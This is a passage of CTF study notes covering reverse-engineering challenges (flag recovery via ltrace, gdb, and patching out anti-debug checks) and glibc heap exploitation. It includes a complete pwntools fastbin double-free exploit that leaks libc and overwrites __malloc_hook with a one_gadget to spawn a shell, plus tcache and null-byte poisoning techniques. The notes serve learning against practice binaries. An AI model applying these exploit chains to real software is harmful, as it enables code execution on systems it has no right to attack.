mmap(0x7ffff7dc9000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1e7000) = 0x7ffff7dc9000
mmap(0x7ffff7dcf000, 15072, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7dcf000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7fdf4c0) = 0
mprotect(0x7ffff7dc9000, 16384, PROT_READ) = 0
mprotect(0x555555557000, 4096, PROT_READ) = 0
mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
munmap(0x7ffff7fe0000, 95222)           = 0
brk(NULL)                               = 0x555555559000
brk(0x55555557a000)                     = 0x55555557a000
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 5), ...}) = 0
write(1, "Wrong!\n", 7Wrong!
)                 = 7
exit_group(0)                           = ?
+++ exited with 0 +++
```

Not useful at all.

#### Actually is way easier than it looks like

Now lets try `ltrace` on it:

```sh
$ ltrace ./revmem ciao
malloc(30)                                                                                         0x555555559260
strncmp("flag{this_was_an_easy_reverse}", "ciao", 30)                                            
puts("Wrong!"Wrong!
)                                                                                   
+++ exited (status 0) +++
```

Well...

This is happening because of this line of code:

```c
cmp = strncmp(flag,*(char **)(param_2 + 8),0x1e);
```

From which we can see that the program is taking the flag which is hardcoded in memory.

```c
char * flag_extractor(void)

{
  char *flag;
  byte local_15;
  int i;

  flag = (char *)malloc(30);
  local_15 = 0;
  for (i = 0; i < 30; i = i + 1) {
    flag[i] = PTR_DAT_00104048[i] ^ local_15;
    local_15 = flag[i];
  }
  return flag;
}
```

From this snippet of code we can see that the flag is put in memory by a `malloc` after being obtained by XORing the encoded version of the flag. Because of the `strcmp` with the flag in memory and our input we can see the flag in clear with `ltrace`.

### revmemp

Very similar to revmem. Both `strace` and `ltrace` outputs are not very useful in this case. We can try to debug the application when the `strcmp` between the user input and the flag gets executed. From the disassembler:

```assembly
0010136d e8 be fc ff ff      CALL      <EXTERNAL>::strncmp
```

Which corresponds to:

```c
int strncmp(char * __s1, char **)(arg2+8),33);
```

If we try to put a breakpoint there and to debug it:

```shell
pwndbg> brva 0x136d
Breakpoint 2 at 0x55555555536d
pwndbg> c
Continuing.
plz don't!
[Inferior 1 (process 17406) exited with code 0377]
```

Turns out we can't debug it with gdb:

```c
void debugger_stopper(void)

{
  long lVar1;

  lVar1 = ptrace(PTRACE_TRACEME,0,1,0);
  if (lVar1 == -1) {
    puts("plz don\'t!");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  return;
}
```

Rip. This is a special function called `INIT` function, which is called before the begin of the main, which means that they are kind of hidden. Good way to find them: looking at which text output they prints, and search for it into Ghidra, or run strings on the binary

Can we stop the binary from escaping that check? Yes, we just need to patch the binary: we could, for example, replace the `exit(-1)` with tops to avoid this check altogether.

Still, we have another problem. The following function gets called multiple time during execution:

```c
void wtf(void)

{
  char *aux;

  aux = (char *)entry;
  while( true ) {
    if (aux == (char *)0x101425) {
      return;
    }
    if (((*(uint *)aux & 0xf0) == 0xc0) && ((*(uint *)aux & 0xf) == 0xc)) break;
    aux = aux + 1;
  }
  puts("do not play with me!");
                    /* WARNING: Subroutine does not return */
  exit(-1);
}
```

It basicaly checks if the first and second symbols of entry are breakpoints (`0xcc`). It basically avoids the user from using them.

#### How to patch the binary (`xxd`, the hard way)

We'll be using vim. First of all open the binary: `vim ./revmemnp`. then input the following:

```shell
:%!xxd
```

this gives us hex dump of the binary. Then we need to search for the byte codes of the instruction we want to replace. To search in vim we use the forward slash command. So, we want to replace the exit in the debugger avoider function to be a bunch of nop. So we'll first search for its first opcode:

```
/e8
```

Then press enter, and keep pressing n until we find our function:

```
000012f0: 00e8 4afd ffff bfff ffff ffe8 80fd ffff  ..J.............
```

Then we can use I to enter intert mode, overwrite it with pops (note that it is made up of 5 opcodes, which means we need 5 nops), and pass `:%!xdd -r` and `:wq` to save and exit. Or you could just use a gui hex editor, it works either way.

#### The exploit

Basically we just need to overwrite both checks, the one which prevents us from setting a breakpoint, and the one that checks if we have gdb attached. Once the binary has been patched to remove the exit, we just start the binary with `gdb`, set a breakpoint in the `strcmp`, and then we can just see the flag in clear as argument of the `strcmp`:

```sh
 ► 0x55555555536d    call   strncmp@plt                <strncmp@plt>
        s1: 0x555555559670 ◂— 'flag{this_was_a_bit_more_complex}'
        s2: 0x7fffffffe57a ◂— 0x5f434c006f616963 /* 'ciao' */
        n: 0x21
```

---

### keycheck_baby

In this challenge we have to reverse engineer a key encryption algorithm divided in two steps. We have the key which is split in two and encrypted differently using two loops.

#### Pt.1

```c
      for (i = 0; (uint)i < 13; i = i + 1) {
        if ((char)(j[i] ^ "babuzz"[(ulong)(long)i % 6]) != magic0[i]) goto LAB_00101487;
      }
```

This first loop XORs the key with characters from the string `babuzz` % 6 (modulo), which is the length of the string itself. Easy reverse, since we have the result of the XOR, which is the `magic0` variable and we can just XOR the two to get past it (since the XOR is an invertible function):

```python
for i in range(0, 13):
   tmp.append(chr(magic0[i] ^ b'babuzz'[i % 6]))
flag = ''.join(tmp)
print(f'flag pt.1: {flag}, len: {len(flag)}')
```

#### Pt.2

As for the second one:

```c
      for (i = 0; (uint)i < 12; i = i + 1) {
        local_85 = local_85 + *j;
        j = j + 1;
                    /* if this check does not fail the program terminates. To avoid that, local_85
                       must be identical to magic1 */
        if (local_85 != magic1[i]) goto LAB_00101487;
      }
```

We have a **CBC encryption algorithm**:

> Cipher block chaining (CBC) is a mode of operation for a [block cipher](https://www.techtarget.com/searchsecurity/definition/block-cipher) -- one in which a sequence of bits are encrypted as a single unit, or block, with a [cipher](https://www.techtarget.com/searchsecurity/definition/cipher) key applied to the entire block. Cipher block chaining uses what is known as an initialization vector ([IV](https://whatis.techtarget.com/definition/initialization-vector-IV)) of a certain length.
>

Implemented as such:

```c
      for (i = 0; (uint)i < 12; i = i + 1) {
        local_85 = local_85 + *j;
        j = j + 1;
                    /* if this check does not fail the program terminates. To avoid that, local_85
                       must be identical to magic1 */
        if (local_85 != magic1[i]) goto LAB_00101487;
      }
```

**Note**: in both loops the label `LAB_00101487` take the instruction pointer to the end of the main, making the program exit. To reverse this we need an equation system as such:
$$
\left\{
    \begin{array}{ll}
p_{0} = c_{0} - IV \\
p_{1} = c_{1} - c_{0} \\
... \\
p_{n} = c_{n} - c_{n-1} \\
\end{array}
\right.
$$
Where $IV$ is the initialization vector. This can be implemented in python as follows:

```python
local_85 = -0x45    # IV
tmp.append(chr(magic1[0] - local_85 & 0xff))
for i in range(1, 12):
   tmp.append(chr(magic1[i] - magic1[i-1] & 0xff))
```

In the code above $p_{i}$ are characters of the flag, while $c_{i}$ are characters of `magic1`. 

### crackme

Another easy reversing challenge, in this case we have a XOR cypher:

```c
marker = true;
for (i = 0; enc_key[i] != '\0'; i = i + 1) {
  if ((char)(flag[i] ^ enc_key[i]) != (&cypertext)[i]) {
    marker = false;
  }
}
```

Solution:

```python
from binascii import hexlify, unhexlify

key = b'\x19\x83\x89\xD2\x6E\x1F\x84\x1C\x94\x11\x31\x82\xDE\x04\xE9\x9B\xF0\xC9\x18\xBB\x82\x51\xAA\xBA\x13\x9E\x44\xEC\x49\xE5\xAD\x49\x01\x86\xAB\x39\x6A\x00'
cypertext = b'\x7F\xEF\xE8\xB5\x15\x73\xB4\x6A\xA7\x7D\x48\xDD\xEA\x6A\x9D\xAA\x82\xFA\x6E\xE4\xF6\x23\x9B\xD9\x78\xAB\x1B\x9B\x16\x96\x9C\x2E\x6F\xB2\xC7\x0C\x17\x00'

tmp = []
for i in range(len(cypertext)):
    tmp.append(chr(cypertext[i] ^ key[i]))
flag = ''.join(tmp)

print(f'flag: {flag}')
```

## Heap

### fastbin-attack

#### Environment setup

We are given the loader because there may be inconsistencies with the given `libc` and the system loader:

```shell
> ls
fastbin_attack  ld-2.23.so  libc-2.23.so  port
```

How do we bind the given loader and `libc` to the binary?

1. Fastest way: set the `LD_PRELOAD` environmental variable:

   ```sh
   LD_PRELOAD=./libc-2.23.so ./binary
   ```

   This solution uses system's loader.

2. To use both a different loader and a different library:

   ```shell
   ./ld-2.23.so --library-path ./lib ./binary
   ```

3. Most sofisticated way:

   [NixOS/patchelf: A small utility to modify the dynamic linker and RPATH of ELF executables (github.com)](https://github.com/NixOS/patchelf)

   ```shell
    patchelf --set-interpreter ./ld-2.23.so --replace-needed libc.so.6 ./libc-2.23.so ./binary
   ```

   To check which library a binary (`./binary`) we can use `ldd ./binary`.

If we run `fastbin-attack` with the 1st method we get a `SEGFAULT`, because we need also the loader. Also the following:

```shell
./ld-2.23.so --library-path ./lib ./fastbin-attack
```

goes in `SEGFAULT`.

#### note on Ghidra pseudo C readability

While exploring the pseudo C generated by Ghidra, we notice that some pieces of code are very hard to read, like disassembled `while` loops:

```c
  while (((int)i < 100 && (*(long *)(entries + (long)(int)i * 0x10) != 0))) {
    i = i + 1;
  }
```

Since we are incresing the size of the single item, we need to decrease the number of array cells ($1600*1=200*8$). Result:

```c
  while (((int)i < 100 && (entries[(long)(int)i * 2] != 0))) {
    i = i + 1;
  }
```

#### What does it do

Basically the binary manipulates lists that have the following structure:

| Pointer to return | space |
| ----------------- | ----- |

~~Then we have another list that contains zero or one depending if the pointer contained in the first column is valid or not.~~ Actually we have no second list, retyping in Ghidra fixed that for us. It allows us to allocate, write and free some text by using the heap.

**A problem with `read_entry`**

The `read_entry` function has a security vulnerability:

```c
void read_entry(void)

{
  int iVar1;

  printf("Index: ");
  iVar1 = read_integer();
  if ((iVar1 < 0) || (99 < iVar1)) {
    puts("Index out of range!");
  }
  else {
    if (entries[(long)iVar1 * 2] == 0) {
      puts("Not allocated yet!");
    }
    else {
      puts((char *)entries[(long)iVar1 * 2]);
    }
  }
  return;
}
```

It prints the `entries` variable after checking if the pointer is valid, but **it does not check if the pointer has been freed**. This is a memory leak. If you are wondering what that check should look like, this is the relevent snippet from the `write_entry` function:

```c
...
else {
    if (*(char *)((long)entries + (long)i * 16 + 12) == '\x01') {
        puts("Can\'t write on a freed entry!");
}
...
```

The check is performed against the state list that was introduced before.

**Note**: `entries` is a global variable.

**how to put breakpoints in PIE binaries**

Given the address of a certain instruction in a disassembled binary, for example we can call it `<ADDR>`, we can still put a breakpoint in it:

```python
gdb.attach(r, '''
    brva <ADDR> <BINARY>
    c
''')
```

**more improvements on disassembled code readability**

After retyping the structure used by the binary, we get the following code for the `write_entry` function:

```c
void write_entry(void)

{
  int i;
  printf("Index: ");
  i = read_integer();
  if ((i < 0) || (99 < i)) {
    puts("Index out of range!");
  }
  else {
    if (*(char *)((long)&entries[i].size + 4) == '\x01') {
      puts("Can\'t write on a freed entry!");
    }
    else {
      if (entries[i].msg == (char *)0x0) {
         puts("Not allocated yet!");
      }
      else {
         printf("Content: ");
         read(0,entries[i].msg,(ulong)*(uint *)&entries[i].size);
         entries[i].msg[*(int *)&entries[i].size - 1] = '\0';
         puts("Done!");
      }
    }
  }
  return;
}
```

Which is much better if you ask me. Still something is wrong:

```c
if (*(char *)((long)&entries[i].size + 4) == '\x01')
```

This probably means that `size` actually is not a `long` (8 bytes), but it is an `int` (4 bytes). If we edit the structure according to this, it would have a `char*` and two `int`. New pseudo code of the same function:

```c
void write_entry(void)

{
  int i; 
  printf("Index: ");
  i = read_integer();
  if ((i < 0) || (99 < i)) {
    puts("Index out of range!");
  }
  else {
    if (*(char *)&entries[i].freed == '\x01') {
      puts("Can\'t write on a freed entry!");
    }
    else {
      if (entries[i].msg == (char *)0) {
         puts("Not allocated yet!");
      }
      else {
         printf("Content: ");
         read(0,entries[i].msg,(ulong)(uint)entries[i].size);
         entries[i].msg[entries[i].size - 1] = '\0';
         puts("Done!");
      }
    }
  }
  return;
}
```

Which is actually readable.

**A problem with `free_entry`**

```c
void free_entry(void)
{
  uint i;
  printf("Index: ");
  i = read_integer();
  if (((int)i < 0) || (99 < (int)i)) {
    puts("Index out of range!");
  }
  else {
    free(entries[i].msg);
    *(undefined *)&entries[i].freed = 1;
    printf("Index %d freed!\n",(ulong)i);
  }
  return;
}
```

Same as the other function: there is no check in place. We can free a chunk more than once. This means that we can basically print everything we want, which means that we can also leak the address of `libc`.

#### The exploit in theory

1. vulnerability: `read_entry`, can be used to leak stuff.

2. vulnerability: `free_entry`, we can free more than once chunks -> fastbin attack to make `malloc` allocate something in memory: the address of `system()` into either `__free_hook` or `__malloc_hook`.

   More specifically when overwriting `__free_hook` we overwrite it with `system` and we pass `/bin/sh` to it. Instead when we overwrite `__malloc_hook`  we use `one_gadget` since the parameter of the `malloc` is a number, not a string.

#### The exploit in practice

**simplifying the process**

To change loader and library with pwntools (if we do not want to use the patched binary):

```python
r = ssh.process("./fa/ld-2.23.so --library-path ./fa ./fa/fastbin_attack".split(" "))
```

Assuming that the parent folder containing all the needed files is called `fa`.

To simplify the work we will build functions in python to interact with the functions of the binary, which are:

1. `alloc`
2. `write_entry`
3. `read_entry`
4. `free_entry`

So, for example:

```python
def alloc(size):
    r.recvuntil(b'> ')
    r.sendline(b'1')
    r.recvuntil(b'Size: ')
    r.sendline(b'%d', % size)
```

We will also need to parse the index which gets printed by the function:

```python
import re

def alloc(size):
    ...
    m = re.match(b"Allocated at index (\d+)!", indexline)
    return int(m.group(1))
```

Same for writing chunks:

```python
def write_chunk(index, content):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"Content: ")
    r.send(content)
```

And for reading and freeing:

```python
def read_chunk(index):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    data = r.recvuntil(b"Options:\n")
    return data[:-len(b"Options:\n")]    # we need to process received output
                                        # we remove 'Output:\n' from received
                                        # output

def free_chunk(index):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
```

Now that we can interact easily with the functions we can build the actual exploit:

```python
chunk_a = alloc(0x200)
chunk_b = alloc(0x30)
free_chunk(chunk_a)
libc_leak = u64(read_chunk(chunk_a)[:6]+b"\x00\x00")
libc_base = libc_leak - 0x3c4b78

print("[!] libc_leak: %#x" % libc_leak)
print("[!] libc_base: %#x" % libc_base)
```

**Part 1: leaking libc address** 

We need to leak `libc`, how do we do it? We allocate a small bin and **free it**, since after the free it will contain an address to a location which is is located into libc:

```python
chunk_a = alloc(0x200)
free(chunk_a)
print(chunk_a, read(chunk_a))    
```

This happens because when we have only one chunk it will contain a random libc address, from which we can compute the address of the base of the libc. To find the offset we will use `vmmap` in gdb.

**Part 2: exploiting ~~`__free_hook`~~ `__malloc_hook` to spawn a shell**

```python
chunk_c = alloc(size)
chunk_d = alloc(size)

free_chunk(chunk_c)
free_chunk(chunk_d)
free_chunk(chunk_c)
```

By allocating two chunks and freeing both of them, and again the first one, we will get a loop: `chunk_1` points to `chunk_2` and vice versa. Then

```python
chunk_A = alloc(SIZE)
write_chunk(b'A'*8)

chunk_B = alloc(SIZE)
chunk_C = alloc(SIZE)
# trigger
chunk_D = alloc(SIZE)
```

Will result in `0x4141414141414141` becoming ?. Now we can put the address of `__free_hook ` in its place.

Still the program crashes because the `malloc` realizes that there's a mismatch with the size of the bin. We need to find some bytes not zeroed that are located before our target and try to match the size with those bytes, since they will be our new size for the chunk.

If we do not find those bytes we can search elsewhere, for example near `__malloc_hook`.

We find that before `__malloc_hook` we have an address, but we know that after translating it to decimal it would be a gigantic number. We could exploit the alignment to take only part of it. For example we can go from `0x7ffff7...` to `0x7f`. To align we just add some bytes to the address of the cell to 'cut' its content according to our needs.

Then we take the address of that cell, we compute its offset, and put it in our script in place of `__malloc_hook`. Full exploit:

```python
# part 1: leaking libc address
input('press any key to start exploiting...')
chunk_a = alloc(0x200)
chunk_b = alloc(0x30)
free_chunk(chunk_a)
libc_leak = u64(read_chunk(chunk_a)[:6]+b"\x00\x00")

# libc base address found by checking the base of libc with
# mmap in gdb, and then computing the difference wrt the
# address just printed
libc_base = libc_leak - 0x3c4b78
malloc_hook = libc_base + malloc_hook_offset
one_gadget = libc_base + magic_gadget

print('[!] malloc_hook: %#x' % malloc_hook)
print('[!] libc_leak: %#x' % libc_leak)
print('[!] libc_base: %#x' % libc_base)
print('[!] one_gadget: %#x' % one_gadget)

# part 2: the exploit
chunk_c = alloc(size)
chunk_d = alloc(size)

# we created the loop
free_chunk(chunk_c)
free_chunk(chunk_d)
free_chunk(chunk_c)

# the vuln code will use chunk_c like it's both still allocated
# and like it is not
# which means that we can write a target address into memory
# and we can override the hook of the malloc function to get
# arbitrary code execution when its called
chunk_c = alloc(size)
write_chunk(chunk_c, p64(malloc_hook-0x23))

alloc(size)             
alloc(size)

# with the following call to alloc()
# we are going to allocate a new chunk into a fast bin
# the fast bin address will be taken from the fast bin
# double linked list which we corrupted to point to an
# arbitrary address instead of the one of a valid chunk
# this means that we will allocate and make writable any
# part of the memory pointed by the address we wrote before
target = alloc(size)

# we will do what we just described to write the address of
# a batch of instructions that will spawn a shell in place of
# the hook of the malloc function
write_chunk(target, b'A'*(35-16) + p64(one_gadget))

# we will call the malloc function, since now it's hook
# points to the magic gadget, a shell will be spawned instead
# of calling the malloc
input('press any key to execute payload...')
r.recvuntil(b"> ")
r.sendline(b"1")
r.recvuntil(b"Size: ")
input('press any key...')
r.sendline(b"%d" % size)
r.interactive()
```

### playground

#### What does it do

It has only the `main` function which encompasses all the functionality. There are some nested loops that executes the following functionalities:

```shell
malloc n, free p, show p [n], write p [n]
```

Basically it can:

* Allocate a chunk of size `n` and return its address
* Free a chunk, given its address `p`
* Show the content of a chunk given `p`. By default it shows the first 8 bytes of data, unless a size `n` is specified.
* Write some data into a chunk, given `p`.

There are some obvious vulnerabilities: for e.g. the chunk freeing is achieved without checking if the chunk is allocated or not, which could be used as an attack surface to carry a fast bin attack.

#### `libc` version

A note about `libc` version: the program is using `libc` version 2.27 <u>which incorporates a backport of the tcache key</u>.

#### The exploit

Here's what we need to do in order to exploit this binary:

1. Set to zero `min_heap`
2. Overwrite `max_heap` with a high value
3. Overwrite `__malloc_hook` with the magic gadget.

**Note**: `min_heap` and `max_heap` are two global variables on which a sort of boundary check is performed before working with the heap.

**Setting `min_heap` to zero**

We need to exploit the presence of the key in the tcache, since it allows us to overwrite any DWORD with zeros. Here's an example:

```shell
$ LD_PRELOAD=./libc-2.27.so ./playground
pid: 10714
main: 0x5555555551d9
> malloc 32
==> 0x555555559280
> malloc 32
==> 0x5555555592b0
> free 0x555555559280
==> ok
> free  0x5555555592b0
==> ok
> show  0x5555555592b0 2
0x5555555592b0:   0x555555559280
0x5555555592b8:   0x555555559010
> write 0x5555555592b0 8
==> read
AAAAAAAAA
==> done
> Commands: malloc n, free p, show p [n], write p [n]
> show 0x5555555592b0 2
0x5555555592b0: 0x4141414141414141
0x5555555592b8:   0x555555559010
> malloc 32
==> 0x5555555592b0
> malloc 32
[1]    10714 segmentation fault (core dumped)  LD_PRELOAD=./libc-2.27.so ./playground
```

We can see that the program segfaulted because it tried to allocate `0x4141414141414141`.

#### Note about `one_gadget`

If we use the following flag: `--level 1` when running `one_gadget` it will find a lot more gadgets.

### pkm

```shell
❯ file pkm_nopie
pkm_nopie: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 4.4.0, BuildID[sha1]=13e816c2d730c2c5220d79c23e1d166432537e9b, with debug_info, not stripped
```

#### A recall on the heap

**Allocated chunk**

```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Free chunk**

```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                     |A|0|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Forward pointer to next chunk in list             |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Back pointer to previous chunk in list            |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Unused space (may be 0 bytes long)                .
            .                                                               .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|0|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Note about gdb `ptype` command**

`ptype` is a gdb command that allows to print variables of binaries that include symbols. For example in this binary we have the `pkm` variable, which is a struct. Thanks to that command we can print it and implement it in Ghidra for much easier code readability:

```shell
pwndbg> ptype pkm
type = struct pkm {
    uint64_t atk;
    uint64_t def;
    uint64_t hp;
    uint64_t max_hp;
    uint8_t status;
    char *name;
    uint64_t IVs[5];
    move moves[10];
}
pwndbg> ptype move
type = struct move {
    char *name;
    void (*fun)(struct pkm *, struct pkm *);
}
```

More on that:

> `ptype` `typename`
> Print a description of data type typename. typename may be the name of a type, or for C code it may have the form `class class-name', `struct struct-tag', `union union-tag' or `enum enum-tag'.

**Some informations about the heap management**

If we try to allocate a new pokemon, and to rename it, we get the following heap configuration:

```shell
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x405100
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x405120
Size: 0x20ee1
```

As we can see the chunk `0x101` bytes big is the chunk containing the pokemon, since it is allocated with a `malloc(0xf8)`. The `0x21` chunk instead is the chunk allocated to read from stdin the pokemon name, since the `get_string` function allocates a chunk of arbitrary size, and I passed to it `len('pikachu')`. Content of pokemon in the heap:

```
x/12gx  0x405000
0x405000:       0x0000000000000000      0x0000000000000101
0x405010:       0x0000000000000028      0x000000000000000a
0x405020:       0x0000000000000064      0x0000000000000064
0x405030:       0x0000000000000000      0x0000000000405110
```

Note that the chunk, as said before, is 257 bytes long, which is 32 WORDS. From `0x405100` and on we have another chunk, which in this case is the one containing the string which represents the pokemon name, and then we have the top chunk.

As for the content itself, we've got the statistics, which is decimal values look like this:

```
 *Name: pikachu
 *ATK:  40
 *DEF:  10
 *HP:   100/100
 *Moves:
```

And then there's the pointer to the pokemon name, which is `0x405110`. As for the second chunk we've got:

```
0x405100:       0x0000000000000000      0x0000000000000021
0x405110:       0x00756863616b6970      0x0000000000000000
```

Which makes sense, since its `0x21` bytes long, which is 4 WORDS long.

#### Exploit idea

We need to put in place a null byte poisoning exploit, which can be achieved trough the function used to assign names to pokemons:

```c
char * get_string(void) {
  long in_FS_OFFSET;
  uint size;
  uint i;
  char *chunk;
  long canary;

  canary = *(long *)(in_FS_OFFSET + 0x28);
  size = 0;
  while (size == 0) {
    printf("[.] insert length: ");
    __isoc99_scanf(&format_str,&size);
  }
  chunk = (char *)malloc((ulong)size);
  i = 0;
  while ((i < size && (read(0,chunk + i,1), chunk[i] != '\n'))) {
    i = i + 1;
  }
                    /* here's your null byte */
  chunk[i] = '\0';
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return chunk;
  }
  __stack_chk_fail();
}
```

To bypass the null byte overflow mitigation we need to exploit the `rename_pokemon` function, and fill a buffer which should contain a pokemon name with fake previous sizes. This is the function that calls `get_string`:

```c
void rename_pkm(void) {
  pkm *ppVar1;
  byte pkm;
  undefined8 uVar2;

  puts("[*] Rename PKM!");
  pkm = get_pkm();
  if ((*(long *)((long)&(&pkms)[(int)(uint)pkm]->name + 7) != 0) &&
     (*(undefined **)((long)&(&pkms)[(int)(uint)pkm]->name + 7) != UNKNOWN)) {
    free(*(void **)((long)&(&pkms)[(int)(uint)pkm]->name + 7));
  }
  ppVar1 = (&pkms)[(int)(uint)pkm];
  uVar2 = get_string();
  *(undefined8 *)((long)&ppVar1->name + 7) = uVar2;
  return;
}
```

Where `UNKNOWN` is a global variable containing an address to the 'PKM' hardcoded string. ~~This means that we can avoid to free a chunk if we previously wrote that in it.~~

#### How to perform the `null byte` poisoning

If we create two pokemon and allocate two chunks of `0x200`, that's the situation on the heap:

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x405100
Size: 0x101

Allocated chunk | PREV_INUSE
Addr: 0x405200
Size: 0x211

Allocated chunk | PREV_INUSE
Addr: 0x405410
Size: 0x211

Top chunk | PREV_INUSE
Addr: 0x405620
Size: 0x209e1
```

Let's call those chunk as follows:

1. **Chunk 1**: first chunk in the heap, it's pokemon 1
2. **Chunk 2**: second chunk, it's pokemon 2
3. **Chunk 3**: third chunk, it corresponds to pokemon 1 name
4. **Chunk 4**: third chunk, it corresponds to pokemon 2 name

Let's remember that the vulnerable function is the one that allocates the chunks of arbitrary length, which is the one we used to allocate the two `0x200` chunks. here's their content:

```
pwndbg> x/68gx 0x405200
0x405200:       0x0000000000000000      0x0000000000000211
0x405210:       0x4141414141414141      0x4141414141414141
0x405220:       0x4141414141414141      0x4141414141414141
0x405230:       0x4141414141414141      0x4141414141414141
0x405240:       0x4141414141414141      0x4141414141414141
0x405250:       0x4141414141414141      0x4141414141414141
0x405260:       0x4141414141414141      0x4141414141414141
0x405270:       0x4141414141414141      0x4141414141414141
0x405280:       0x4141414141414141      0x4141414141414141
0x405290:       0x4141414141414141      0x4141414141414141
0x4052a0:       0x4141414141414141      0x4141414141414141
0x4052b0:       0x4141414141414141      0x4141414141414141
0x4052c0:       0x4141414141414141      0x4141414141414141
0x4052d0:       0x4141414141414141      0x4141414141414141
0x4052e0:       0x4141414141414141      0x4141414141414141
0x4052f0:       0x4141414141414141      0x4141414141414141
0x405300:       0x4141414141414141      0x4141414141414141
0x405310:       0x4141414141414141      0x4141414141414141
0x405320:       0x4141414141414141      0x4141414141414141
0x405330:       0x4141414141414141      0x4141414141414141
0x405340:       0x4141414141414141      0x4141414141414141
0x405350:       0x4141414141414141      0x4141414141414141
0x405360:       0x4141414141414141      0x4141414141414141
0x405370:       0x4141414141414141      0x4141414141414141
0x405380:       0x4141414141414141      0x4141414141414141
0x405390:       0x4141414141414141      0x4141414141414141
0x4053a0:       0x4141414141414141      0x4141414141414141
0x4053b0:       0x4141414141414141      0x4141414141414141
0x4053c0:       0x4141414141414141      0x4141414141414141
0x4053d0:       0x4141414141414141      0x4141414141414141
0x4053e0:       0x4141414141414141      0x4141414141414141
0x4053f0:       0x4141414141414141      0x4141414141414141
0x405400:       0x4141414141414141      0x4141414141414141
0x405410:       0x0000000000000000      0x0000000000000211
```

In the last row we have the header of the following chunk. As for the chunk at `0x405200`, we have the usual structure:

```
    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of previous chunk, if unallocated (P clear)  |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             User data starts here...                          .
            .                                                               .
            .             (malloc_usable_size() bytes)                      .
            .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             (size of chunk, but used for application data)    |
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
            |             Size of next chunk, in bytes                |A|0|1|
            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

Now, if we delete the first pokemon (chunk 1), we free both chunk 1 and chunk 3, since the binary will delete both the chunk containing the pokemon itself, and the chunk containing its name. We end up in this situation:

```c
pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405000
Size: 0x101
fd: 0x405200
